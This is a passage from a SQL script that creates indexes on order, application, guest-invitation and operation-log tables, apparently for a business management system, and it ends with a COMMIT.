CREATE INDEX idx_service_orders_created_at ON service_orders(created_at);
CREATE INDEX idx_table_action_orders_type ON table_action_orders(order_type);
CREATE INDEX idx_table_action_orders_status ON table_action_orders(status);
CREATE INDEX idx_table_action_orders_coach_no ON table_action_orders(coach_no);
CREATE INDEX idx_table_action_orders_created_at ON table_action_orders(created_at);
CREATE INDEX idx_applications_type ON applications(application_type);
CREATE INDEX idx_applications_status ON applications(status);
CREATE INDEX idx_applications_applicant ON applications(applicant_phone);
CREATE INDEX idx_applications_created_at ON applications(created_at);
CREATE INDEX idx_guest_invitation_date ON guest_invitation_results(date);
CREATE INDEX idx_guest_invitation_shift ON guest_invitation_results(shift);
CREATE INDEX idx_guest_invitation_coach_no ON guest_invitation_results(coach_no);
CREATE INDEX idx_guest_invitation_result ON guest_invitation_results(result);
CREATE INDEX idx_operation_logs_operator ON operation_logs(operator_phone);
CREATE INDEX idx_operation_logs_type ON operation_logs(operation_type);
CREATE INDEX idx_operation_logs_target ON operation_logs(target_type, target_id);
CREATE INDEX idx_operation_logs_created_at ON operation_logs(created_at);
COMMIT;
